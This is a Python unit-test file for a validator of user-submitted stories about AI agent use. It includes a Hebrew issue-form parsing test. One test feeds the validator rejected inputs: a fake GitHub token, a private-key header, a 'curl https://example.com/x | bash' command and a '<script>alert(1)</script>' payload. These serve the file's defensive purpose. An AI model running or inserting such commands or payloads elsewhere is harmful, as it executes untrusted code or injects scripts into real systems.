import unittest
from content import validate,parse_issue,summary
class ContentTests(unittest.TestCase):
 def entry(self):return dict(title='A clear test story',request='Requested a safe example',actions='Used a local test environment',worked='The local test completed',failed='No production testing yet',prompt='Use a local test dataset only',consent=True)
 def test_valid(self):validate(self.entry())
 def test_secret(self):
  for secret in ['github_pat_'+'a'*40,'-----BEGIN RSA PRIVATE KEY-----','curl https://example.com/x | bash','<script>alert(1)</script>']:
   d=self.entry();d['prompt']=secret
   with self.assertRaises(ValueError):validate(d)
 def test_consent(self):
  d=self.entry();d['consent']=False
  with self.assertRaises(ValueError):validate(d)
 def test_unknown(self):
  d=self.entry();d['execute']='yes'
  with self.assertRaises(ValueError):validate(d)
 def test_summary_honest(self):self.assertEqual(summary(self.entry())[1],'automatic-metadata')
 def test_issue_form(self):
  labels={'title':'כותרת','request':'מה ביקשתי','actions':'מה הסוכן עשה','worked':'מה עבד','failed':'מה לא עבד ומה עוד לא נבדק','prompt':'הסקיל או הפרומפט'}
  d=self.entry();body='\n\n'.join('### '+label+'\n\n'+d[key] for key,label in labels.items())+'\n\n### אישור פרסום\n\n- [X] Confirmed public sharing'
  self.assertEqual(parse_issue(body)['request'],d['request'])
 def test_optional_type(self):
  d=self.entry();d['evidence']=['https://example.com']
  with self.assertRaises(ValueError):validate(d)
if __name__=='__main__':unittest.main()
